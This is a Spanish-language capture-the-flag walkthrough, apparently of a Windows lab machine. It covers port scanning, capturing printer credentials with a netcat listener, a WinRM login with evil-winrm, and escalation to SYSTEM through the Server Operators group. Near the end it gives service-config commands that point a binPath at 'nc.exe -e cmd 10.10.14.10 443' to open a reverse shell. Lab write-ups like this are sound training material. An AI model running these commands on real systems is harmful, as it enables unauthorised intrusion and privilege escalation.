Al hacer nmap podemos ver un montón de puertos abiertos, entre los mas importantes son: 80,445,3895 etc.

En esta máquina nada más ver los servicios expuertos lo que hacemos es validar con las herramientas nxc(CrackMapExec), smbmap y smbclient si nos podemos conectar con una NULL session. Visto que no podemos vamos a investigar la página web y vemos lo siguiente:

En la pestaña Settings podemos ver lo siguiente:

Parece ser que trata de establecer una conexión a través del Server Address y el Server port. Lo primero que podemos hacer es echarle un ojo al campor password ya que parece que contiene información.

Si vamos al inspector de elementos podemos ver que en el campo password se representa la información como text y no como password por lo que lo más probable es que los asteriscos sean texto plano.

La segunda opción es hacer que este software de impresora trate de hacer una conexión con un listener en netcat.

Si hacemos esto nos manda una petición con el usuario y la contraseña. Tratamos de validar con nxc si podemos conectarnos con estas credenciales pero vemos que no.

También habíamos visto el puerto 3895 el cual corresponde a WinRm el cual es un servicio de administración remoto de windows. Hacemos la validación como con smb y vemos lo siguiente:

Por lo que tenemos conectividad. Para conectarnos usamos el siguiente comando con la utilidad Evil-winrm: evil-winrm -i ipObjetivo -u 'usuario' -p 'contraseña' y ya estamos dentro:

Una cosa que podríamos checkear para escalar los privilegios es analizar que privilegios tiene el usuario con el que estamos conectados:

Con el comando whoami /priv podemos ver todos los privilegios que tenemos, pero para esta máquina no irá por aquí la escalada de privilegios, aunque se puede escalar por aquí.

Con el comando net user usuario vemos lo siguiente

Vemos que estamos dentro del grupo Remote Management Use el cual nos permitió conectarnos por winrm. También somos parte del grupo Server Operators.

Dentro del grupo Server Operators tenemos la potestad de iniciar y parar servicios. Antes de parar o crear servicios vamos a tratar de modificarlos.

Lo primero que haremos , por si acaso, es subir el netcat que tenemos en linux a la máquina por si podemos modificar y establecer con el BinPath una shell privilegiada.

Ejecutamos el comando locate nc.exe que es el netcat que vamos a subir a la máquina. Con el comando upload y con la dirección absoluta de donde está en netcat lo podremos subir.

Checkeamos si podemos crear un servicio con el comando siguiente: sc.exe create reverse binPath="C:\ruta abosoluta donde esta el netcat -e cmd miIp 443" y vemos que no podemos , ahora vamos a tratar de modificar los servicios ya existentes.

Con el comando: sc.exe config VMTools binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd 10.10.14.10 443" vamos a tratar de modificar el binPath para que nos ejecute la orden de mandarnos una shell.

Ahora solo debemos ponernos en escucha con el netcat y parar y encender el servicio.

Una vez con la reverse shell ya podemos ver que somos el usuario NT Authority System
